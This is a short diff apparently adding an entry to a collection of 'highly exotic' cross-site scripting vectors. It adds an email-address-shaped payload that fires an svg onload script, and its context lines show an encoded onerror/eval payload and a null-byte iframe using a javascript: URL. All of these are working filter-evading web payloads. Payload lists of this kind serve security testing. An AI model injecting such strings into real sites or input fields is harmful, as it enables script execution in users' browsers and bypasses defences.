@@ -6,6 +6,8 @@ I REQUEST TO CONTRIBUTE TO THE PROJECT BY INCLUDING ONLY HIGHLY EXOTIC XSS VECTO
 
 
 ```
+“><svg/onload=alert(document.domain)>”@x.y
+
 onerror%3Deval%3Bthrow'%3Dalert%5Cx281%5Cx29'%3B
 
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
